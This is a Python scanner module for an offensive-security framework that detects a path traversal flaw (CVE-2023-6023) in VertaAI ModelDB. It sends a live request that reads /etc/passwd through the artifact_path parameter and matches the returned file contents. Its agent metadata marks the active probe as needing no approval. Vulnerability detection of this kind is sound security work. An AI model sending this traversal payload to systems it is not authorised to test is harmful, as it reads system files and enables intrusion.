#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The endpoint "/api/v1/artifact/getArtifact?artifact_path=" is vulnerable to path traversal."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'VertaAI ModelDB - Path Traversal Detection',
        'description': 'The endpoint "/api/v1/artifact/getArtifact?artifact_path=" is vulnerable to path traversal. The main cause of this vulnerability is due to the lack of validation and sanitization of the artifact_path parameter.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'lfi', 'modeldb', 'vertaai', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://huntr.com/bounties/644ab868-db6d-4685-ab35-1a897632d2ca/',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-6023',
        ],
        'cve': 'CVE-2023-6023',
    }

    def run(self):
        r = self.http_request(method="GET", path='/api/v1/artifact/getArtifact?artifact_path=../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_all = ('application/octet-stream', 'filename=',)
        body_regexes = ('root:.*:0:0:',)
        if (all(m in headers for m in header_all)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="VertaAI ModelDB - Path Traversal detected",
                path='/api/v1/artifact/getArtifact?artifact_path=../../../../../etc/passwd',
            )
            return True
        return False

